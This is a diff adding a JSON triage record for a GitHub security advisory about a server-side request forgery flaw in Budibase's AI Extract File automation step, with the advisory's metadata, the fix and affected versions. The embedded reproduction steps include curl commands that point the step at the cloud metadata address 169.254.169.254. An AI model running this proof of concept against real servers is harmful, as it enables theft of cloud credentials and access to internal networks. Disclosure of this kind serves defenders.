@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/60306789?v=4\", \"events_url\": \"https://api.github.com/users/morimori-dev/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/morimori-dev/followers\", \"following_url\": \"https://api.github.com/users/morimori-dev/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/morimori-dev/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/morimori-dev\", \"id\": 60306789, \"login\": \"morimori-dev\", \"node_id\": \"MDQ6VXNlcjYwMzA2Nzg5\", \"organizations_url\": \"https://api.github.com/users/morimori-dev/orgs\", \"received_events_url\": \"https://api.github.com/users/morimori-dev/received_events\", \"repos_url\": \"https://api.github.com/users/morimori-dev/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/morimori-dev/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/morimori-dev/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/morimori-dev\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-45548\", \"cvss\": {\"score\": 7.7, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 7.7, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-918\", \"name\": \"Server-Side Request Forgery (SSRF)\"}], \"description\": \"## Vulnerability Details\\n\\n**CWE-918**: Server-Side Request Forgery (SSRF)\\n\\nThe `processUrlFile` function in `packages/server/src/automations/steps/ai/extract.ts` uses `fetch(fileUrl)` directly **without the IP blacklist validation** that is consistently applied to all other automation steps. This allows an authenticated user to trigger server-side requests to internal network addresses.\\n\\n### Vulnerable Code\\n\\n**`packages/server/src/automations/steps/ai/extract.ts` (lines 116, 139)**:\\n\\n```typescript\\nasync function processUrlFile(fileUrl: string, ...): Promise<ExtractInput> {\\n  const response = await fetch(fileUrl)  // NO blacklist check!\\n  // ...\\n  const fallbackResponse = await fetch(fileUrl)  // Also NO blacklist check!\\n}\\n```\\n\\n### Contrast with All Other Automation Steps (Same Codebase)\\n\\nEvery other automation step that makes outbound HTTP requests properly uses `fetchWithBlacklist`:\\n\\n- `steps/slack.ts:19`: `response = await fetchWithBlacklist(url, {...})`\\n- `steps/discord.ts:28`: `response = await fetchWithBlacklist(url, {...})`\\n- `steps/zapier.ts:33`: `response = await fetchWithBlacklist(url, {...})`\\n- `steps/n8n.ts:53`: `response = await fetchWithBlacklist(url, request)`\\n- `steps/outgoingWebhook.ts`: `response = await fetchWithBlacklist(url, {...})`\\n- `steps/make.ts`: `response = await fetchWithBlacklist(url, {...})`\\n\\nThe `fetchWithBlacklist` function (`steps/utils.ts:100`) validates URLs against the IP blacklist which blocks:\\n- `127.0.0.0/8` (loopback)\\n- `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16` (RFC1918 private)\\n- `169.254.0.0/16` (link-local / cloud metadata)\\n- IPv6 private addresses\\n\\nThe AI Extract File step bypasses all of these protections.\\n\\n## Steps to Reproduce\\n\\n### Via Budibase UI\\n\\n1. Login as builder user\\n2. Create or open any app\\n3. Go to **Automations** > **New Automation**\\n4. Add trigger: **App Action**\\n5. Add step: **AI > Extract File Data**\\n6. Set Source: `URL`\\n7. Set File URL: `http://169.254.169.254/latest/meta-data/` (or any internal IP)\\n8. Click **Run Test** — the server makes the request without IP blacklist validation\\n\\n### Via curl (API)\\n\\n```bash\\n# 1. Login and get session cookie\\ncurl -s -c /tmp/bb.txt \\\\\\n  \\\"http://BUDIBASE_HOST/api/global/auth/default/login\\\" \\\\\\n  -X POST -H \\\"Content-Type: application/json\\\" \\\\\\n  -d '{\\\"username\\\":\\\"YOUR_EMAIL\\\",\\\"password\\\":\\\"YOUR_PASSWORD\\\"}'\\n\\n# 2. Create automation with SSRF payload (replace YOUR_APP_ID)\\ncurl -s -b /tmp/bb.txt \\\\\\n  \\\"http://BUDIBASE_HOST/api/automations\\\" \\\\\\n  -X POST -H \\\"Content-Type: application/json\\\" \\\\\\n  -H \\\"x-budibase-app-id: YOUR_APP_ID\\\" \\\\\\n  -d '{\\\"name\\\":\\\"SSRF PoC\\\",\\\"definition\\\":{\\\"trigger\\\":{\\\"stepId\\\":\\\"APP\\\",\\\"event\\\":\\\"row:save\\\"},\\\"steps\\\":[{\\\"stepId\\\":\\\"AI_EXTRACT\\\",\\\"inputs\\\":{\\\"source\\\":\\\"URL\\\",\\\"fileUrl\\\":\\\"http://169.254.169.254/latest/meta-data/\\\"}}]}}'\\n```\\n\\n### Code Review Verification\\n\\nCompare the vulnerable function with the safe pattern used everywhere else:\\n\\n```\\nVULNERABLE (no blacklist):\\n  packages/server/src/automations/steps/ai/extract.ts:116\\n    const response = await fetch(fileUrl)\\n\\nSAFE (with blacklist) - every other step:\\n  packages/server/src/automations/steps/slack.ts:19\\n    response = await fetchWithBlacklist(url, {...})\\n  packages/server/src/automations/steps/discord.ts:28\\n    response = await fetchWithBlacklist(url, {...})\\n```\\n\\n### Expected vs Actual Behavior\\n\\n**Expected**: `processUrlFile()` should reject internal/private IPs via `fetchWithBlacklist()`\\n**Actual**: `fetch(fileUrl)` is called directly, allowing requests to 127.0.0.1, 10.x.x.x, 169.254.169.254 etc.\\n\\n## Impact\\n\\nAn authenticated user with builder permissions can:\\n\\n- **Access cloud metadata endpoints** (AWS IAM credentials, GCP service tokens, Azure IMDS)\\n- **Scan internal network** services and ports\\n- **Access internal APIs** not intended for external access\\n- **Exfiltrate data** from internal services via the automation response\\n\\nIn Budibase Cloud (SaaS), this could be used to steal cloud provider credentials, potentially leading to full infrastructure compromise.\\n\\n## Proposed Fix\\n\\nReplace `fetch(fileUrl)` with `fetchWithBlacklist(fileUrl)`, consistent with all other automation steps:\\n\\n```typescript\\nimport { fetchWithBlacklist } from \\\"../utils\\\"\\n\\nasync function processUrlFile(fileUrl: string, ...): Promise<ExtractInput> {\\n  const response = await fetchWithBlacklist(fileUrl)  // Use blacklist\\n  // ...\\n  const fallbackResponse = await fetchWithBlacklist(fileUrl)  // Use blacklist\\n}\\n```\", \"epss\": {\"percentage\": 0.00258, \"percentile\": 0.16875}, \"ghsa_id\": \"GHSA-rpj4-7x2v-wjrf\", \"github_reviewed_at\": \"2026-05-15T17:47:10Z\", \"html_url\": \"https://github.com/advisories/GHSA-rpj4-7x2v-wjrf\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-rpj4-7x2v-wjrf\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-45548\"}], \"nvd_published_at\": \"2026-05-27T18:16:25Z\", \"published_at\": \"2026-05-15T17:47:10Z\", \"references\": [\"https://github.com/Budibase/budibase/security/advisories/GHSA-rpj4-7x2v-wjrf\", \"https://github.com/Budibase/budibase/releases/tag/3.38.4\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-45548\", \"https://github.com/advisories/GHSA-rpj4-7x2v-wjrf\"], \"repository_advisory_url\": \"https://api.github.com/repos/Budibase/budibase/security-advisories/GHSA-rpj4-7x2v-wjrf\", \"severity\": \"high\", \"source_code_location\": \"https://github.com/Budibase/budibase\", \"summary\": \"Budibase: SSRF in AI Extract File Automation Step via Missing IP Blacklist Validation\", \"type\": \"reviewed\", \"updated_at\": \"2026-06-08T23:50:36Z\", \"url\": \"https://api.github.com/advisories/GHSA-rpj4-7x2v-wjrf\", \"vulnerabilities\": [{\"first_patched_version\": \"3.34.8\", \"package\": {\"ecosystem\": \"npm\", \"name\": \"@budibase/server\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"< 3.34.8\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-rpj4-7x2v-wjrf",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "@budibase/server: < 3.34.8"
+    ],
+    "authentication_required": true,
+    "cves": [
+      "CVE-2026-45548"
+    ],
+    "cvss_score": 7.7,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "@budibase/server"
+    ],
+    "remote": true,
+    "vendor_severity": "high"
+  },
+  "first_seen_at": "2026-07-20T19:51:59.992297Z",
+  "provenance": {
+    "content_sha256": "e0f2c814bfeb85f1fb26d80e24ae2558e346e3fa626cb0a2566d0bf9163bd80a",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-05-15T17:47:10Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-rpj4-7x2v-wjrf",
+  "status": "active",
+  "title": "Budibase: SSRF in AI Extract File Automation Step via Missing IP Blacklist Validation",
+  "updated_at": "2026-06-08T23:50:36Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-rpj4-7x2v-wjrf"
+}
